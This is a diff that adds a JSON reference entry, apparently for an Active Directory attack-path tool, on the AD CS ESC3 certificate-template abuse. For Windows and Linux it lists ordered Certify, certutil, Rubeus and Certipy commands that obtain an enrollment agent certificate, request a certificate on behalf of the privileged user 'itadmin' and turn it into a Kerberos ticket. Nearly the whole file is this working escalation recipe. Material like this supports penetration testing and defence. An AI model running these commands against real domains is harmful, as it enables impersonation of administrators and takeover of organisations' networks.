@@ -1,0 +1,54 @@
+{
+    "ADCSESC3": {
+        "meaning": "The principal has permission to enroll on a certificate allowing them to obtain an enrollment agent certificate. They also have permission to enroll for a certificate template that permits enrollment by enrollment agents and can be used for authentication.",
+        "common": "",
+        "windows": {
+            "Certify": [
+                {
+                    "order": 1,
+                    "command": "Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:Vuln-EnrollmentAgent",
+                    "description": "Request enrollment agent certificate"
+                },
+                {
+                    "order": 2,
+                    "command": "certutil.exe -MergePFX .\\enrollmentcert.pem .\\enrollmentcert.pfx",
+                    "description": "Convert enrollment agent certificate to PFX format"
+                },
+                {
+                    "order": 3,
+                    "command": "Certify.exe request /ca:CORPDC01.CORP.LOCAL\\CORP-CORPDC01-CA /template:User /onbehalfof:CORP\\itadmin /enrollcert:enrollmentcert.pfx",
+                    "description": "Request certificate on behalf of target user using enrollment agent certificate"
+                },
+                {
+                    "order": 4,
+                    "command": "certutil.exe -MergePFX .\\itadminenrollment.pem .\\itadminenrollment.pfx",
+                    "description": "Convert target user certificate to PFX format"
+                },
+                {
+                    "order": 5,
+                    "command": "Rubeus.exe asktgt /user:itadmin /domain:corp.local /certificate:itadminenrollment.pfx",
+                    "description": "Request TGT using target user certificate for authentication"
+                }
+            ]
+        },
+        "linux": {
+            "Certipy": [
+                {
+                    "order": 1,
+                    "command": "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'Vuln-EnrollmentAgent'",
+                    "description": "Request enrollment agent certificate using Certipy"
+                },
+                {
+                    "order": 2,
+                    "command": "certipy req -u 'user@corp.local' -p 'password' -dc-ip 'DC_IP' -target 'ca_host' -ca 'ca_name' -template 'User' -on-behalf-of 'CORP\\itadmin' -pfx 'enrollmentcert.pfx'",
+                    "description": "Request certificate on behalf of target user using enrollment agent certificate"
+                },
+                {
+                    "order": 3,
+                    "command": "certipy auth -pfx itadmin.pfx -dc-ip DC_IP",
+                    "description": "Authenticate using target user certificate to obtain TGT"
+                }
+            ]
+        }
+    }
+}
